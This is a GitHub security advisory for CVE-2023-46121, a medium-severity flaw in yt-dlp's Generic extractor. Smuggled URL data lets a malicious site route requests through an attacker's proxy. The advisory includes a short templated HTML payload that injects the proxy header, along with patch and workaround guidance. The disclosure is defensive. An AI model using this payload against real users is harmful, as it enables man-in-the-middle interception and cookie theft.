# [M] yt-dlp Generic Extractor MITM Vulnerability via Arbitrary Proxy Injection

## Summary
Severity: Medium
Advisory: GHSA-3ch3-jhc6-5r8x
CVE: CVE-2023-46121
CWE: CWE-444, CWE-613
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2023-11-15
Source: https://github.com/advisories/GHSA-3ch3-jhc6-5r8x
Type: github-advisory

## Affected
- PyPI: `yt-dlp` — affected >=2022.10.04 <2023.11.14

## Details
### Impact
The Generic Extractor in yt-dlp is vulnerable to an attacker setting an arbitrary proxy for a request to an arbitrary url, allowing the attacker to MITM the request made from yt-dlp's HTTP session. This could lead to cookie exfiltration in some cases.

<details>

To pass extra control data between extractors (such as headers like `Referer`), yt-dlp employs a concept of "url smuggling". This works by adding this extra data as json to the url fragment ("smuggling") that is then passed on to an extractor. The receiving extractor then "unsmuggles" the data from the input url. This functionality is intended to be internal only.

Currently, the Generic extractor supports receiving an arbitrary dictionary of HTTP headers in a smuggled url, of which it extracts and adds them to the initial request it makes to such url. This is useful when a url sent to the Generic extractor needs a `Referer` header sent with it, for example.

Additionally, yt-dlp has internal headers to set a proxy for a request: `Ytdl-request-proxy` and `Ytdl-socks-proxy`. While these are deprecated, internally `Ytdl-request-proxy` is still used for `--geo-verification-proxy`.

However, it is possible for a maliciously crafted site include these smuggled options in a url which then the Generic extractor extracts and redirects to itself.  This allows a malicious website to **set an arbitrary proxy for an arbitrary url that the Generic extractor will request.**

This could allow for the following, but not limited too:
- An attacker can MITM a request it asks yt-dlp to make to **any** website.
   - If a user has loaded cookies into yt-dlp for the target site, which are not marked as [secure](https://en.wikipedia.org/wiki/Secure_cookie), they could be exfiltrated by the attacker.
   - Fortunately most sites are HTTPS and should be setting cookies as secure.
- An attacker can set cookies for an arbitrary site.

An example malicious webpage:
```html
<!DOCTYPE html>
<cinerama.embedPlayer('t','{{ target_site }}#__youtubedl_smuggle=%7B%22http_headers%22:%7B%22Ytdl-request-proxy%22:%22{{ proxy url }}%22%7D,%22fake%22:%22.smil/manifest%22%7D')
```

Where `{{ target_site }}` is the URL Generic extractor will request and `{{ proxy url }}` is the proxy to proxy the request for this url through.

</details>

### Patches
- We have removed the ability to smuggle `http_headers` to the Generic extractor, as well as other extractors that use the same pattern.

### Workarounds
- Disable Generic extractor (`--ies default,-generic`), or only pass trusted sites with trusted content.
- Take caution when using `--no-check-certificate`.

### References
- <https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x>
- <https://nvd.nist.gov/vuln/detail/CVE-2023-46121>
- <https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14>
- <https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb>

## References
- https://github.com/yt-dlp/yt-dlp/security/advisories/GHSA-3ch3-jhc6-5r8x
- https://nvd.nist.gov/vuln/detail/CVE-2023-46121
- https://github.com/yt-dlp/yt-dlp/commit/f04b5bedad7b281bee9814686bba1762bae092eb
- https://github.com/yt-dlp/yt-dlp
- https://github.com/yt-dlp/yt-dlp/releases/tag/2023.11.14
